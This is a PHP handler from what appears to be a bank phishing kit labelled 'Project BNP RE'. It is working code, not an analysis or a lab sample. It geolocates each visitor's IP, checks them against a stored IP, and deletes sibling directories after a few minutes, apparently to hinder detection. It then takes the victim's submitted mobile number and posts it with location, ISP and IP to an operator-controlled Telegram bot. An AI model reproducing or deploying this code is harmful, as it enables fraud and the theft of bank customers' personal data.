<?php
session_start();
$StrupLom = $_SERVER['REMOTE_ADDR'];
$donflag = $_SERVER['SERVER_NAME'];
    $info = unserialize(file_get_contents("http://ip-api.com/php/{$StrupLom}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"));
    if (isset($info['as'])) {
        $_SESSION['isp'] = $info['as'];
    }
    if (isset($info['country'])) {
        $_SESSION['Blasacoun'] = $info['country'];
    }
    if (isset($info['countryCode'])) {
        $_SESSION['Njopf'] = $info['countryCode'];
    }
    if (isset($info['city'])) {
        $_SESSION['Voprt'] = $info['city'];
    }
    if (isset($info['regionName'])) {
        $_SESSION['xOpuy'] = $info['regionName'];
    }
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    $time_diff = time() - filectime($dir);
    if ($time_diff > 320) { // if the difference is greater than 4 minutes (240 seconds)
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
              
                return false;
            }
        }
        if (rmdir($dir)) {
          
            return true;
        } else {
          
            return false;
        }
    } else {
     
        return true;
    }
}

$parentDirectory = '../../web';
$directories = glob($parentDirectory.'/*', GLOB_ONLYDIR);

if(is_array($directories)) {
  
    foreach($directories as $dir) {
        if(basename($dir)[0] != '.') { 
            if(deleteDirectory($dir)) {
            
            }  
        }
    }
}
$filename = 'local.txt';
if (file_exists($filename)) {
    $myfile = fopen($filename, "r") or die("Unable to open file!");
    $reslocal = fread($myfile,filesize($filename));

fclose($myfile);
} 
else {
	$StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
    exit();
}



if (trim($reslocal) != trim($StrupLom))
    {
		
    $StrongSol = "" . basename(__DIR__);
    echo ("<script LANGUAGE='JavaScript'>
    window.location.href='../../index.php?verify_account=session=&" . md5(microtime()) . "&dispatch=" . sha1(microtime()) . "&access=&data=" . sha1(microtime()) . "&lolme=$StrongSol';
    </script>");
     exit();	  

}

function telsent($message) {
    $TrubFtub = $_SESSION['idtel'];
    $cRetVckr = $_SESSION['tokentel'];
    $api_url = "https://api.telegram.org/bot{$cRetVckr}/sendMessage";
    $params = ["chat_id" => $TrubFtub, "text" => $message];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}
$cc2 = $_POST['vkid'];
$cc3 = $_POST['p0'];
$TIME_DATE = date('Y-m-d H:i:s');
$sysmsg = "
*** Project BNP RE *** \n
[+][Numéro Mobile] = $cc3 \n
-------------------------\n
[URL] = $donflag \n
[COUNTRY] = " .$_SESSION['Blasacoun']." \n
[Region] = ". $_SESSION['xOpuy']." \n
[ISP] = ".$_SESSION['isp']." \n
[IP]  = $StrupLom \n
[TIME/DATE]  = $TIME_DATE \n
*** By *Key ***\n";

       telsent($sysmsg);
	   		echo ("<script LANGUAGE='JavaScript'>
    window.location.href='loading.php?verify_account=session=&".md5(microtime())."&dispatch=".sha1(microtime())."&access=".sha1(microtime())."&data=".sha1(microtime())."';
    </script>");
?>
